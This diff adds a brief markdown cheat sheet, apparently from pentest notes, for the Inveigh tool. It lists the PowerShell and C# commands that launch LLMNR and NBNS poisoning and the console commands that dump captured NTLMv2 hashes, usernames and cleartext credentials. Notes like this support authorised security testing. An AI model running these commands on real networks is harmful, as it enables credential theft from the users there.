@@ -1,0 +1,32 @@
+# Inveigh
+
+## Purpose
+Windows equivalent of Responder.
+
+Captures:
+- NTLMv1
+- NTLMv2
+- cleartext creds
+
+## PowerShell version
+
+`Import-Module .\Inveigh.ps1
+
+`Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+`Stop-Inveigh
+
+## C# version
+
+`.\Inveigh.exe
+
+## Console Commands
+
+`GET NTLMV2
+`GET NTLMV2UNIQUE
+`GET NTLMV2USERNAMES
+`GET CLEARTEXT
+`STOP
+
+## Notes
+Used when operating from Windows host.
